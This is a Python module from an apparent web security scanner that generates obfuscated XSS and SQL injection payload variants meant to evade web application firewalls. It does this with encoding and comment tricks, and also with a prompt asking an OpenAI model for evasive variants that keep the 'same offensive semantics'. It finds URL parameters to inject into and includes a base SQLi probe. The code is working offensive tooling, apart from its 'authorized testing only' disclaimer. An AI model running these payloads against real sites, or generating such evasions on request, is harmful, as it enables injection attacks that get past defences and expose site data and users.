# Developed by Channa Sandeepa | OmniScan-AI v2.5 | Copyright 2026
"""AI-Mutator: LLM-assisted WAF-oriented payload variants (+ heuristic fallback).

Requires ``OPENAI_API_KEY`` or ``OMINSCAN_OPENAI_API_KEY`` for cloud generation.
Without a key, returns 10 heuristic transforms only.

Authorized security testing only.
"""

from __future__ import annotations

import json
import os
import re
from typing import Any, Literal
from urllib.parse import parse_qsl, urlparse, urlunparse

import requests

from .ai_auditor import AIAuditor
from .payload_obfuscation import double_url_encode, hex_percent_encode
from .xss_scanner import XSSScanner

PayloadKind = Literal["auto", "xss", "sqli"]

_SQLI_BASE_PROBE = "' OR '1'='1'-- "
_PARAM_SUGGESTS_SQLI = re.compile(
    r"(?i)(^|_)(id|ids|pk|uid|oid|nid|user_?id|account_?id|order_?id|invoice_?id|"
    r"doc_?id|record_?id|customer_?id|profile_?id)(_|$)"
)


def _detect_kind(payload: str) -> str:
    p = payload.lower()
    if "<script" in p or "javascript:" in p or "onerror=" in p or "<svg" in p:
        return "xss"
    if any(
        x in p
        for x in (
            "union",
            "select",
            "or 1=1",
            "' or ",
            "sleep(",
            "benchmark(",
            "waitfor",
            "--",
            "/*",
        )
    ):
        return "sqli"
    return "xss" if "<" in payload and ">" in payload else "sqli"


def _extract_variants_obj(text: str) -> list[str] | None:
    raw = (text or "").strip()
    if not raw:
        return None
    if raw.startswith("```"):
        raw = re.sub(r"^```(?:json)?\s*", "", raw, flags=re.IGNORECASE)
        raw = re.sub(r"\s*```\s*$", "", raw)
    try:
        obj = json.loads(raw)
    except json.JSONDecodeError:
        start = raw.find("{")
        end = raw.rfind("}")
        if start >= 0 and end > start:
            try:
                obj = json.loads(raw[start : end + 1])
            except json.JSONDecodeError:
                return None
        else:
            return None
    if not isinstance(obj, dict):
        return None
    v = obj.get("variants")
    if isinstance(v, list):
        out = [str(x).strip() for x in v if str(x).strip()]
        return out if out else None
    return None


def _openai_variants(payload: str, kind: str, count: int) -> tuple[list[str], str | None]:
    key = os.environ.get("OMINSCAN_OPENAI_API_KEY") or os.environ.get("OPENAI_API_KEY")
    if not key:
        return [], "no API key"
    base = (
        os.environ.get("OMINSCAN_OPENAI_BASE_URL") or "https://api.openai.com/v1"
    ).rstrip("/")
    model = os.environ.get("OMINSCAN_OPENAI_MODEL") or "gpt-4o-mini"
    sys_msg = (
        "You are an authorized penetration-testing assistant. The user supplies "
        "a test payload for a target they own or have in-scope written permission to test. "
        "Respond with compact JSON only, no markdown."
    )
    user_msg = (
        f"Payload type hint: {kind} (xss = cross-site scripting test string; "
        f"sqli = SQL injection test string).\n"
        f"Original payload (verbatim, preserve meaning):\n{payload}\n\n"
        f"Produce exactly {count} distinct obfuscated variants designed to evade "
        "naive WAF / input filters while preserving the same offensive semantics. "
        "Use encodings, comments, case tricks, whitespace/alternate delimiters, "
        "and other mutations appropriate to the payload class.\n"
        'Return JSON: {{"variants": ["...", "..."]}} with length variants == '
        f"{count}."
    )
    url = f"{base}/chat/completions"
    body: dict[str, Any] = {
        "model": model,
        "temperature": 0.9,
        "response_format": {"type": "json_object"},
        "messages": [
            {"role": "system", "content": sys_msg},
            {"role": "user", "content": user_msg},
        ],
    }
    try:
        r = requests.post(
            url,
            headers={"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
            json=body,
            timeout=120,
        )
        r.raise_for_status()
        data = r.json()
        msg = (data.get("choices") or [{}])[0].get("message") or {}
        content = str(msg.get("content") or "").strip()
        got = _extract_variants_obj(content)
        if not got:
            return [], "LLM returned no variants"
        return got[:count], None
    except requests.RequestException as exc:
        return [], f"LLM request failed: {exc}"
    except (KeyError, IndexError, TypeError, ValueError) as exc:
        return [], f"LLM parse error: {exc}"


def _sqli_heuristic(base: str, existing: set[str], need: int) -> list[str]:
    out: list[str] = []
    candidates = [
        "/**/".join(base.split()) if " " in base else base + "/**/",
        re.sub(
            r"(?i)(select|union|where|and|or)",
            lambda m: m.group(0).swapcase(),
            base,
            count=3,
        ),
        double_url_encode(base),
        hex_percent_encode(base),
        base.replace(" ", "%09"),
        base.replace(" ", "/**/"),
        base.replace("OR", "||").replace("or", "||")
        if "or" in base.lower()
        else base + "||'1'='1",
        "/*!50000" + base[:80] + "*/" if len(base) < 120 else "/*!50000" + base[:60] + "*/",
        base + "%23" if not base.rstrip().endswith("#") else base,
        base[:-1] + "\n--\n" if len(base) > 4 else base + "-- -",
    ]
    for c in candidates:
        if c and c not in existing and len(out) < need:
            existing.add(c)
            out.append(c)
        if len(out) >= need:
            break
    i = 0
    while len(out) < need:
        noise = base + f"'+/*!{i}*/+'1"
        i += 1
        if noise not in existing:
            existing.add(noise)
            out.append(noise)
    return out


def _xss_heuristic(base: str, existing: set[str], need: int) -> list[str]:
    out: list[str] = []
    for row in AIAuditor.mutate_xss_payload(base):
        p = str(row.get("payload") or "")
        if p and p not in existing:
            existing.add(p)
            out.append(p)
        if len(out) >= need:
            return out[:need]
    for row in AIAuditor.chained_waf_mutations(
        [base], max_chains_per_base=6, chain_depth=2
    ):
        p = str(row.get("payload") or "")
        if p and p not in existing:
            existing.add(p)
            out.append(p)
        if len(out) >= need:
            break
    while len(out) < need:
        p = base + f"<!--{len(out)}-->"
        if p not in existing:
            existing.add(p)
            out.append(p)
    return out[:need]


def mutate_payload_waf(
    payload: str,
    kind: PayloadKind | str = "auto",
    *,
    count: int = 10,
) -> tuple[list[dict[str, Any]], str | None]:
    """
    Produce ``count`` obfuscated variants. Each row:
    ``index``, ``payload``, ``source`` (``llm`` | ``heuristic``), ``technique``.
    """
    payload = (payload or "").strip()
    if not payload:
        return [], "empty payload"
    n = max(1, min(int(count), 32))
    resolved = kind if kind != "auto" else _detect_kind(payload)
    if resolved not in ("xss", "sqli"):
        resolved = "xss"

    rows: list[dict[str, Any]] = []
    seen: set[str] = set()
    llm_err: str | None = None

    llm_list, err = _openai_variants(payload, resolved, n)
    if err:
        llm_err = err
    for p in llm_list:
        if not p or p in seen:
            continue
        seen.add(p)
        rows.append(
            {
                "index": len(rows) + 1,
                "payload": p,
                "source": "llm",
                "technique": "openai_chat",
            }
        )
        if len(rows) >= n:
            break

    need = n - len(rows)
    if need > 0:
        if resolved == "sqli":
            extra = _sqli_heuristic(payload, seen, need)
        else:
            extra = _xss_heuristic(payload, seen, need)
        base_idx = len(rows)
        for j, p in enumerate(extra):
            rows.append(
                {
                    "index": base_idx + j + 1,
                    "payload": p,
                    "source": "heuristic",
                    "technique": "rule_engine",
                }
            )
            if len(rows) >= n:
                break

    for i, r in enumerate(rows[:n], start=1):
        r["index"] = i
    return rows[:n], llm_err


def _probe_and_kind_for_param(param_name: str, mutate_kind: str) -> tuple[str, str]:
    if mutate_kind == "sqli":
        return _SQLI_BASE_PROBE, "sqli"
    if mutate_kind == "xss":
        return XSSScanner.PAYLOADS[0], "xss"
    if _PARAM_SUGGESTS_SQLI.search(param_name or ""):
        return _SQLI_BASE_PROBE, "sqli"
    return XSSScanner.PAYLOADS[0], "xss"


def discovered_param_slots(
    target_url: str,
    param_rows: list[dict],
    xss_rows: list[dict],
    *,
    max_slots: int = 48,
) -> list[dict[str, str]]:
    """Unique parameter injection slots from param probe, XSS rows, and target URL query."""
    slots: list[dict[str, str]] = []
    seen: set[tuple[str, str, str]] = set()

    def add(param: str, method: str, page_url: str) -> None:
        param = (param or "").strip()
        if not param:
            return
        mu = (method or "GET").strip().upper() or "GET"
        base = (page_url or "").strip().split("?", 1)[0].strip()
        if not base:
            return
        key = (param.lower(), mu, base)
        if key in seen:
            return
        seen.add(key)
        slots.append({"param": param, "method": mu, "context_url": base})

    for r in param_rows:
        add(str(r.get("param", "")), str(r.get("method", "GET")), str(r.get("url", "")))
    for r in xss_rows:
        add(str(r.get("param", "")), "GET", str(r.get("url", "")))

    tu = target_url.strip()
    if "://" not in tu:
        tu = f"https://{tu}"
    parsed = urlparse(tu)
    if parsed.query:
        base = urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, parsed.params, "", "")
        )
        for k, _ in parse_qsl(parsed.query, keep_blank_values=True):
            add(k, "GET", base or tu)

    return slots[:max_slots]


def mutate_all_discovered_params(
    slots: list[dict],
    mutate_kind: str = "auto",
    *,
    variants_per_slot: int = 10,
    max_slots: int = 20,
) -> tuple[list[dict[str, Any]], str | None]:
    """
    For each slot, generate ``variants_per_slot`` WAF-oriented variants from a base
    XSS or SQLi probe. Returns per-slot bundles plus an aggregate LLM note (if any).
    """
    bundles: list[dict[str, Any]] = []
    agg_err: str | None = None
    cap = max(1, min(int(max_slots), 40))
    vps = max(1, min(int(variants_per_slot), 32))

    for slot in slots[:cap]:
        base, kind = _probe_and_kind_for_param(slot["param"], mutate_kind)
        variants, err = mutate_payload_waf(base, kind, count=vps)
        if err and agg_err is None:
            agg_err = err
        bundles.append(
            {
                **slot,
                "base_payload": base,
                "payload_kind": kind,
                "variants": variants,
            }
        )
    return bundles, agg_err


def flatten_mutator_bundles(bundles: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Flatten per-slot bundles into report/CLI rows (global index)."""
    out: list[dict[str, Any]] = []
    n = 1
    for b in bundles:
        for v in b.get("variants") or []:
            if not isinstance(v, dict):
                continue
            out.append(
                {
                    "index": n,
                    "payload": v.get("payload"),
                    "source": v.get("source"),
                    "technique": v.get("technique"),
                    "param": b.get("param"),
                    "method": b.get("method"),
                    "context_url": b.get("context_url"),
                    "base_payload": b.get("base_payload"),
                    "payload_kind": b.get("payload_kind"),
                }
            )
            n += 1
    return out
